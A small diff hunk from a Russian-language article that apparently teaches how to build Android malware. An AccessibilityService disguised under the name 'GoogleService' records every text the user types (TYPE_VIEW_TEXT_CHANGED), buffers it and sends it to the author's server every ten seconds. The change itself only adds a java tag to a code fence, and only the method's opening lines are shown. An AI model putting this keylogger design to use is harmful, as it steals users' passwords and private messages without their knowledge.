@@ -527,7 +527,7 @@ public class GoogleService extends AccessibilityService {
 
 Метод ```onAccessibilityEvent()``` принимает все входящие события. Событие ```AccessibilityEvent.TYPE_VIEW_TEXT_CHANGED``` приходит, когда пользователь вводит текст в поле какое-нибудь. Мы отлавливаем именно его. Весь ввод записываем в буфер. И каждые 10 секунд отправляем этот буфер на свой сервер, стартуя ```SendService```. 
 
-```
+```java
 public void onAccessibilityEvent(AccessibilityEvent event) {
         switch (event.getEventType()) {
             case AccessibilityEvent.TYPE_VIEW_TEXT_CHANGED:
